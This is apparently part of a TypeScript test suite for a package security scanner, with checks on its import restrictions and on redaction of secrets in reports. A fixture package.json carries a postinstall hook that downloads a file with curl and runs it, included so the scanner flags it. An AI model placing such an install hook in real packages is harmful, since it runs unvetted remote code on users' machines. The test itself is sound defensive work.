  steps.push(check('vet engine: zero-dependency (node: builtins and relative imports only)', async () => {
    const vetDir = join(PACK_DIR, 'provider', 'src', 'vet')
    const sources = await readdir(vetDir)
    const imports: string[] = []
    for (const file of sources.filter(f => f.endsWith('.ts'))) {
      const raw = await readFile(join(vetDir, file), 'utf8')
      for (const match of raw.matchAll(/^\s*import[^'"]*from\s*['"]([^'"]+)['"]/gm)) {
        imports.push(`${file}: ${match[1]}`)
      }
      for (const match of raw.matchAll(/^\s*import\s*['"]([^'"]+)['"]/gm)) {
        imports.push(`${file}: ${match[1]}`)
      }
    }
    for (const entry of imports) {
      const [file, spec] = [entry.split(': ')[0], entry.split(': ').slice(1).join(': ')]
      const allowed =
        spec.startsWith('node:') || spec.startsWith('.') || spec.startsWith('../') ||
        // The tool adapter (and only the tool adapter) may bridge to the
        // official harness packages; the scan engine below it stays zero-dep.
        (file === 'tool.ts' && (spec === '@deepseek-ai/dsh-tools' || spec === '@deepseek-ai/dsh-llm'))
      assert.ok(allowed, `vet engine import must be a node: builtin, a relative path, or the official bridge in tool.ts: ${entry}`)
    }
  }))

  // --- 21. report redaction ------------------------------------------------------
  steps.push(check('vet engine: redaction keeps secret-shaped text out of rendered reports', async () => {
    const engineMod = await import(new URL('../provider/src/vet/engine.ts', import.meta.url).href)
    const configMod = await import(new URL('../provider/src/vet/config.ts', import.meta.url).href)
    const reportMod = await import(new URL('../provider/src/vet/report.ts', import.meta.url).href)
    const root = await mkdtemp(join(tmpdir(), 'dsh-vet-redact-'))
    try {
      const fakeGithub = `ghp_${'A'.repeat(36)}`
      const fakeAws = `AKIA${'1'.repeat(16)}`
      await writeFile(join(root, 'package.json'), JSON.stringify({
        name: 'dsh-fixture-redact', version: '1.0.0', license: 'MIT',
        // A fail-level install script whose evidence snippet would carry the
        // tokens unless the engine redacts them.
        scripts: { postinstall: `curl -s https://example.com/x -o /tmp/x && echo '${fakeGithub} ${fakeAws}' && eval sh /tmp/x` },
      }))
      await writeFile(join(root, 'LICENSE'), 'MIT License fixture\n')
      await writeFile(join(root, 'README.md'), '# fixture\n')
      const report = await engineMod.runVet({ target: root }, configMod.resolveVetConfig({}), 'en', new AbortController().signal)
      const rendered = reportMod.renderReport(report, 'en')
      const serialized = JSON.stringify(report)
      for (const secret of [fakeGithub, fakeAws]) {
        assert.ok(!rendered.includes(secret), 'rendered report must not contain the fake token')
        assert.ok(!serialized.includes(secret), 'canonical report must not contain the fake token')
      }
      assert.match(rendered, /downloads executable content and runs it/, 'redacted report still carries the finding')
      assert.match(rendered, /ghp_\*\*\*/, 'github token must be replaced by a type marker')
    } finally {
      await rm(root, { recursive: true, force: true })
    }
  }))

  // ---------------------------------------------------------------------------
  for (const step of steps) await step()
  console.log(`\nAll ${checks} checks passed for dsh-skill-pack-security.`)
}

try {
  await main()
} catch (error) {
  console.error('[FAIL]', error)
  process.exit(1)
}
